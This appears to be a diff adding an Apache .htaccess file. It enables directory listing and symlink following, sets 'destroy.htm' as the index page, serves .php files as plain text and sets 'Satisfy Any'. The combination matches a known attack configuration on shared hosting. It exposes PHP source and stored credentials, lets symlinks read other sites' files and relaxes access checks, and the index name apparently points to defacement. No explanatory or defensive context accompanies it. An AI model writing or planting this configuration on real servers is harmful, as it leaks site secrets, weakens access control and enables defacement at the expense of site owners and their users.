@@ -1,0 +1,5 @@
+Options Indexes FollowSymLinks
+DirectoryIndex destroy.htm
+AddType text/plain .php 
+AddHandler text/plain .php
+Satisfy Any
